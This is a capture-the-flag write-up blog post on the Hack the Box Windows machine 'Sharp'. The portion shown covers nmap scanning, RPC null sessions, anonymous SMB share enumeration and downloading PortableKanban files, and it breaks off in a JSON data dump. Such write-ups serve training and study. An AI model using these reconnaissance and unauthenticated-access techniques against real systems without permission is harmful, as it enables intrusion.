<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hack the Box - Sharp Writeup" /><meta property="og:locale" content="en_US" /><meta name="description" content="Zweilosec’s writeup on the hard-difficulty machine Sharp from https://hackthebox.eu" /><meta property="og:description" content="Zweilosec’s writeup on the hard-difficulty machine Sharp from https://hackthebox.eu" /><link rel="canonical" href="https://zweilosec.github.io/posts/sharp/" /><meta property="og:url" content="https://zweilosec.github.io/posts/sharp/" /><meta property="og:site_name" content="Hacker’s Rest" /><meta property="og:image" content="https://zweilosec.github.io/assets/img/sharp-0-infocard.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-05-01T14:00:00+00:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://zweilosec.github.io/assets/img/sharp-0-infocard.png" /><meta property="twitter:title" content="Hack the Box - Sharp Writeup" /><meta name="twitter:site" content="@zweilosec" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-05-03T22:47:36+00:00","datePublished":"2021-05-01T14:00:00+00:00","description":"Zweilosec’s writeup on the hard-difficulty machine Sharp from https://hackthebox.eu","headline":"Hack the Box - Sharp Writeup","image":"https://zweilosec.github.io/assets/img/sharp-0-infocard.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://zweilosec.github.io/posts/sharp/"},"url":"https://zweilosec.github.io/posts/sharp/"}</script><title>Hack the Box - Sharp Writeup | Hacker's Rest</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Hacker's Rest"><meta name="application-name" content="Hacker's Rest"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=UA-170504820-1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-170504820-1'); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar/katana.gif" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Hacker's Rest</a></div><div class="site-subtitle font-italic">Notes documenting my journey to OSCP and beyond.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>PS C:\>WHOAMI</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/zweilosec" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/zweilosec" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack the Box - Sharp Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack the Box - Sharp Writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> zweilosec </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, May 1, 2021, 2:00 PM +0000" prep="on" > May 1, 2021 <i class="unloaded">2021-05-01T14:00:00+00:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, May 3, 2021, 3:47 PM -0700" prefix="Updated " > May 3, 2021 <i class="unloaded">2021-05-03T22:47:36+00:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="7476 words">41 min</span></div><div><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@zweilosec"></div></div><div class="post-content"><h2 id="htb---sharp">HTB - Sharp</h2><h2 id="overview">Overview</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sharp-0-infocard.png" alt="Descriptive information card about machine" /></p><p>This hard-difficulty Windows machine from Hack the Box was both challenging and fun. As the name suggests, it focuses on a few user-made code projects that use the C Sharp programming language. This challenge revolves around both reverse engineering this code and compiling it to escalate privileges. For the most part this machine was pretty straight-forward, with each step laid out clearly with a little bit of standard enumeration. The challenge mainly came from figuring out how to get to the next step after finding the hidden gems in the code. I hope you enjoy this challenge as much as I did!</p><h2 id="useful-skills-and-tools">Useful Skills and Tools</h2><h3 id="recursively-download-all-files-in-a-network-share-with-smbclient">Recursively download all files in a network share with smbclient</h3><p>First, connect to a remote network share using <code class="language-plaintext highlighter-rouge">smbclient</code>. When the prompt changes to <code class="language-plaintext highlighter-rouge">smb: \&gt;</code> type the following commands one at a time.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>smb: \&gt; tarmode
tarmode is now full, system, hidden, noreset, noverbose
smb: \&gt; recurse
smb: \&gt; prompt
smb: \&gt; mget ./
</pre></table></code></div></div><h3 id="create-a-network-share">Create a network share</h3><h4 id="with-powershell">With PowerShell</h4><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">New-SmbShare</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nv">$share_name</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$directory</span><span class="w"> </span><span class="nt">-FullAccess</span><span class="w"> </span><span class="nv">$username</span><span class="w">
</span></pre></table></code></div></div><h4 id="with-cmdexe">With cmd.exe</h4><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">net</span><span class="w"> </span><span class="nx">share</span><span class="w"> </span><span class="nv">$name</span><span class="o">=</span><span class="nv">$directory</span><span class="w"> </span><span class="n">grant:</span><span class="nv">$username</span><span class="p">,</span><span class="nx">full</span><span class="w">
</span></pre></table></code></div></div><h3 id="zip-and-unzip-files-with-powershell">Zip and unzip files with PowerShell</h3><ul><li>https://www.howtogeek.com/670314/how-to-zip-and-unzip-files-using-powershell/</ul><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Compress-Archive</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$in_path</span><span class="w"> </span><span class="nt">-DestinationPath</span><span class="w"> </span><span class="nv">$out_path</span><span class="nx">\</span><span class="nv">$out_filename</span><span class="w">
</span></pre></table></code></div></div><p>From Windows zip up the files in the <code class="language-plaintext highlighter-rouge">$in_path</code> directory specifying the <code class="language-plaintext highlighter-rouge">$out_path</code> and <code class="language-plaintext highlighter-rouge">$out_filename</code>.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Expand-Archive</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$in_path</span><span class="nx">/</span><span class="nv">$zip_file</span><span class="w"> </span><span class="nt">-DestinationPath</span><span class="w"> </span><span class="nv">$out_path</span><span class="w">
</span></pre></table></code></div></div><p>To recover your files afterwards, specify the <code class="language-plaintext highlighter-rouge">$in_path</code> to the <code class="language-plaintext highlighter-rouge">$zip_file</code> and the <code class="language-plaintext highlighter-rouge">$out_path</code> you want the files extracted to.</p><h2 id="enumeration">Enumeration</h2><h3 id="nmap-scan">Nmap scan</h3><p>I started my enumeration with an nmap scan of <code class="language-plaintext highlighter-rouge">10.10.10.219</code>. The options I regularly use are:</p><div class="table-wrapper"><table><thead><tr><th style="text-align: left"><code class="language-plaintext highlighter-rouge">Flag</code><th style="text-align: left">Purpose<tbody><tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-p-</code><td style="text-align: left">A shortcut which tells nmap to scan all ports<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-vvv</code><td style="text-align: left">Gives very verbose output so I can see the results as they are found, and also includes some information not normally shown<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-sC</code><td style="text-align: left">Equivalent to <code class="language-plaintext highlighter-rouge">--script=default</code> and runs a collection of nmap enumeration scripts against the target<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-sV</code><td style="text-align: left">Does a service version scan<tr><td style="text-align: left"><code class="language-plaintext highlighter-rouge">-oA $name</code><td style="text-align: left">Saves all three formats (standard, greppable, and XML) of output with a filename of <code class="language-plaintext highlighter-rouge">$name</code></table></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/sharp]
└─$ nmap -sCV -p- -n -Pn -vvv -oA sharp 10.10.10.219
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-20 19:10 EDT
Nmap scan report for 10.10.10.219

PORT     STATE SERVICE            REASON  VERSION
135/tcp  open  msrpc              syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?      syn-ack
5985/tcp open  http               syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8888/tcp open  storagecraft-image syn-ack StorageCraft Image Manager
8889/tcp open  mc-nmf             syn-ack .NET Message Framing
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -49m26s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 45554/tcp): CLEAN (Timeout)
|   Check 2 (port 34587/tcp): CLEAN (Timeout)
|   Check 3 (port 60685/udp): CLEAN (Timeout)
|   Check 4 (port 49995/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-04-20T22:24:15
|_  start_date: N/A

Nmap done: 1 IP address (1 host up) scanned in 211.94 seconds
</pre></table></code></div></div><p>There were a handful of ports open on this machine. Most were standard Windows ports such as 135 &amp; 139 - RPC, 445 - SMB, and 5985 - Windows Remote Management. There were also two that stood out as different. Port 8888 was reported as ‘StorageCraft Image Manager’ and port 8889 as ‘.NET Message Framing Service’. I decided to start off looking for low-hanging fruit by checking out the open RPC ports.</p><h3 id="port-135---rpc">Port 135 - RPC</h3><p>Whenever I am testing open RPC port the first thing I attempt is to connect without authentication.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/sharp]
└─$ rpcclient -U "" -N 10.10.10.219
rpcclient $&gt;
</pre></table></code></div></div><p>I was able to connect using an RPC null session.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>rpcclient $&gt; srvinfo
        10.10.10.219   Wk Sv NT SNT         
        platform_id     :       500
        os version      :       10.0
        server type     :       0x9003
</pre></table></code></div></div><p>Unfortunately, I was only able to get the server information as none of the other commands were working.</p><h3 id="port-445---smb">Port 445 - SMB</h3><p>Next I moved to the other potential “easy-win” port, Server Message Block. This port can often lead to access of open network shares, or in the case of serious miscofiguration can let an attacker gain full access through named pipe impersonation.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/sharp]
└─$ smbmap -H 10.10.10.219
[+] IP: 10.10.10.219:445        Name: 10.10.10.219                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        dev                                                     NO ACCESS
        IPC$                                                    NO ACCESS       Remote IPC
        kanban                                                  READ ONLY
</pre></table></code></div></div><p>I was able to list shares anonymously, which showed that I had read-only access to a <code class="language-plaintext highlighter-rouge">kanban</code> share. This was interesting, because this was the name of a software development/project management strategy.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/sharp]
└─$ smbclient -U "" -N //10.10.10.219/kanban/
Try "help" to get a list of possible commands.
smb: \&gt; dir
  .                                   D        0  Sat Nov 14 13:56:03 2020
  ..                                  D        0  Sat Nov 14 13:56:03 2020
  CommandLine.dll                     A    58368  Wed Feb 27 03:06:14 2013
  CsvHelper.dll                       A   141312  Wed Nov  8 08:52:18 2017
  DotNetZip.dll                       A   456704  Wed Jun 22 16:31:52 2016
  Files                               D        0  Sat Nov 14 13:57:59 2020
  Itenso.Rtf.Converter.Html.dll       A    23040  Thu Nov 23 11:29:32 2017
  Itenso.Rtf.Interpreter.dll          A    75776  Thu Nov 23 11:29:32 2017
  Itenso.Rtf.Parser.dll               A    32768  Thu Nov 23 11:29:32 2017
  Itenso.Sys.dll                      A    19968  Thu Nov 23 11:29:32 2017
  MsgReader.dll                       A   376832  Thu Nov 23 11:29:32 2017
  Ookii.Dialogs.dll                   A   133296  Thu Jul  3 17:20:12 2014
  pkb.zip                             A  2558011  Thu Nov 12 15:04:59 2020
  Plugins                             D        0  Thu Nov 12 15:05:11 2020
  PortableKanban.cfg                  A     5819  Sat Nov 14 13:56:01 2020
  PortableKanban.Data.dll             A   118184  Thu Jan  4 16:12:46 2018
  PortableKanban.exe                  A  1878440  Thu Jan  4 16:12:44 2018
  PortableKanban.Extensions.dll       A    31144  Thu Jan  4 16:12:50 2018
  PortableKanban.pk3                  A     2080  Sat Nov 14 13:56:01 2020
  PortableKanban.pk3.bak              A     2080  Sat Nov 14 13:55:54 2020
  PortableKanban.pk3.md5              A       34  Sat Nov 14 13:56:03 2020
  ServiceStack.Common.dll             A   413184  Wed Sep  6 07:18:22 2017
  ServiceStack.Interfaces.dll         A   137216  Wed Sep  6 07:17:30 2017
  ServiceStack.Redis.dll              A   292352  Wed Sep  6 07:02:24 2017
  ServiceStack.Text.dll               A   411648  Tue Sep  5 23:38:18 2017
  User Guide.pdf                      A  1050092  Thu Jan  4 16:14:28 2018

                10357247 blocks of size 4096. 7406191 blocks available
</pre></table></code></div></div><p>I used <code class="language-plaintext highlighter-rouge">smbclient</code> to list the files that existed in the <code class="language-plaintext highlighter-rouge">kanban</code> share. There were a bunch of files related to a program called <code class="language-plaintext highlighter-rouge">PortableKanban</code>. The User Guide looked like something I would want to read through. I did a web search for the name of the program, but it did not reveal anything useful.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>smb: \&gt; tarmode
tarmode is now full, system, hidden, noreset, noverbose
smb: \&gt; recurse
smb: \&gt; prompt
smb: \&gt; mget .
NT_STATUS_OBJECT_NAME_INVALID listing \.
smb: \&gt; mget ./
</pre></table></code></div></div><p>The above commands allowed me to recursively download all of the files in the folder. There were a bunch of .dll files that I really hoped I wasn’t going to have to decompile…</p><h3 id="portablekanbanexe">PortableKanban.exe</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sharp-1-user-guide.png" alt="The user manual for the portable kanban executable" /></p><blockquote><p>If you are going to share tasks with someone do not try to share data file and/or Portable Kanban folder over the network, it won’t work. The only possible way is using Redis database server (http://redis.io/).</p></blockquote><p>I had to be on the lookout for a redis server to see if I could connect to a remote instance.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sharp-2-user-parameters.png" alt="Table of the user information fields" /></p><p>The PDF had a lot of information in it, from configuring remote access and storage of the database, to setting up user accounts.</p><blockquote><p>There is the only one default user: “Administrator” with blank password. It’s recommended to change the administrator’s password as soon as you start using Portable Kanban with actual data. There is practically no way to restore dministrator’s password if it is lost.</p></blockquote><p>I needed to check to see if the Administrator password had been changed.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sharp-3-backup-info.png" alt="Information about backing up and restoring the database" /></p><blockquote><p>Plugins are standalone libraries (DLL) developed to extend functionality of Portable Kanban. Plugins may directly access and manipulate existing data, so they have to be used with care. Only power users and administrators can run plugins.</p></blockquote><p>So all of those .dll files were plugins. I wonder if there is a way to get code execution through a malicious .dll plugin here.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sharp-4-developing-plugins.png" alt="Instructions on developing plugins for the kanban program" /></p><h3 id="the-pk3-file">The .pk3 file</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sharp-5-pk3-database.png" alt="Information showing the pk3 file was the database" /></p><p>From the Q&amp;A section I found out that there was a <code class="language-plaintext highlighter-rouge">pk3</code> file that held the data for the program.</p><div class="language-json highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"Columns"</span><span class="p">:[{</span><span class="nl">"Id"</span><span class="p">:</span><span class="s2">"4757781032fd41b2a4511822e2c08850"</span><span class="p">,</span><span class="nl">"SortOrder"</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="nl">"Name"</span><span class="p">:</span><span class="s2">"Demo"</span><span class="p">,</span><span class="nl">"Limit"</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="nl">"TaskOrder"</span><span class="p">:{</span><span class="nl">"SortType"</span><span class="p">:</span><span class="s2">"None"</span><span class="p">,</span><span class="nl">"Parameters"</span><span class="p">:[{</span><span class="nl">"Field"</span><span class="p">:</span><span class="s2">"Completed"</span><span class="p">,</span><span class="nl">"SortOrder"</span><span class="p">:</span><span class="s2">"Descending"</span><span class="p">},{</span><span class="nl">"Field"</span><span class="p">:</span><span class="s2">"Deadline"</span><span class="p">,</span><span class="nl">"SortOrder"</span><span class="p">:</span><span class="s2">"Ascending"</span><span class="p">},{</span><span class="nl">"Field"</span><span class="p">:</span><span class="s2">"Priority"</span><span class="p">,</span><span class="nl">"SortOrder"</span><span class="p">:</span><span class="s2">"Descending"</span><span class="p">},{</span><span class="nl">"Field"</span><span class="p">:</span><span class="s2">"Topic"</span><span class="p">,</span><span class="nl">"SortOrder"</span><span class="p">:</span><span class="s2">"Ascending"</span><span class="p">},{</span><span class="nl">"Field"</span><span class="p">:</span><span class="s2">"Person"</span><span class="p">,</span><span class="nl">"SortOrder"</span><span class="p">:</span><span class="s2">"Ascending"</span><span class="p">}]},</span><span class="nl">"AutoComplete"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nl">"ResetCompleted"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nl">"TimeStamp"</span><span class="p">:</span><span class="mi">637409769443121006</span><span class="p">}],</span><span class="nl">"Tasks"</span><span class="p">:[{</span><span class="nl">"Id"</span><span class="p">:</span><span class="s2">"33870d6dfe4146718ba0b2c9f7bc05cf"</span><span class="p">,</span><span class="nl">"SeriesId"</span><span class="p">:</span><span class="s2">"00000000000000000000000000000000"</span><span class="p">,</span><span class="nl">"SortOrder"</span><span class="p">:</span><span class="s2">"oGdBKcFw"</span><span class="p">,</span><span class="nl">"ColumnId"</span><span class="p">:</span><span class="s2">"4757781032fd41b2a4511822e2c08850"</span><span class="p">,</span><span class="nl">"TopicId"</span><span class="p">:</span><span class="s2">"00000000000000000000000000000000"</span><span class="p">,</span><span class="nl">"PersonId"</span><span class="p">:</span><span class="s2">"00000000000000000000000000000000"</span><span class="p">,</span><span class="nl">"Text"</span><span class="p">:</span><span class="s2">"New Task"</span><span class="p">,</span><span class="nl">"Priority"</span><span class="p">:</span><span class="s2">"Low"</span><span class="p">,</span><span class="nl">"Created"</span><span class="p">:</span><span class="s2">"</span><span class="se">\/</span><span class="s2">Date(1605380100000+0100)</span><span class="se">\/</span><span class="s2">"</span><span class="p">,</span><span class="nl">"CreatedBy"</span><span class="p">:</span><span class="s2">"e8e29158d70d44b1a1ba4949d52790a0"</span><span class="p">,</span><span class="nl">"Modified"</span><span class="p">:</span><span class="s2">"</span><span class="se">\/</span><span class="s2">Date(-62135596800000)</span><span class="se">\/</span><span class="s2">"</span><span class="p">,</span><span class="nl">"ModifiedBy"</span><span class="p">:</span><span class="s2">"00000000000000000000000000000000"</span><span class="p">,</span><span class="nl">"Deadline"</span><span class="p">:</span><span class="s2">"</span><span class="se">\/</span><span class="s2">Date(1605308400000+0100)</span><span class="se">\/</span><span class="s2">"</span><span class="p">,</span><span class="nl">"HasDeadline"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nl">"Completed"</span><span class="p">:</span><span class="s2">"</span><span class="se">\/</span><span class="s2">Date(1605308400000+0100)</span><span class="se">\/</span><span class="s2">"</span><span class="p">,</span><span class="nl">"CompletedBy"</span><span class="p">:</span><span class="s2">"00000000000000000000000000000000"</span><span class="p">,</span><span class="nl">"Done"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nl">"Canceled"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nl">"Link"</span><span class="p">:</span><span class="s2">""</span><span class="p">,</span><span class="nl">"Subtasks"</span><span class="p">:[],</span><span class="nl">"Tags"</span><span class="p">:[],</span><span class="nl">"Estimate"</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="nl">"Progress"</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="nl">"Points"</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="nl">"Comments"</span><span class="p">:[],</span><span class="nl">"CustomFields"</span><span class="p">:{},</span><span class="nl">"TimeStamp"</span><span class="p">:</span><span class="mi">637409769542424146</span><span class="p">}],</span><span class="nl">"TimeTracks"</span><span class="p">:[],</span><span class="nl">"Persons"</span><span class="p">:[],</span><span class="nl">"Topics"</span><span class="p">:[],</span><span class="nl">"Tags"</span><span class="p">:[],</span><span class="nl">"Views"</span><span class="p">:[],</span><span class="nl">"Users"</span><span class="p">:[{</span><span class="nl">"Id"</span><span class="p">:</span><span class="s2">"e8e29158d70d44b1a1ba4949d52790a0"</span><span class="p">,</span><span class="nl">"Name"</span><span class="p">:</span><span class="s2">"Administrator"</span><span 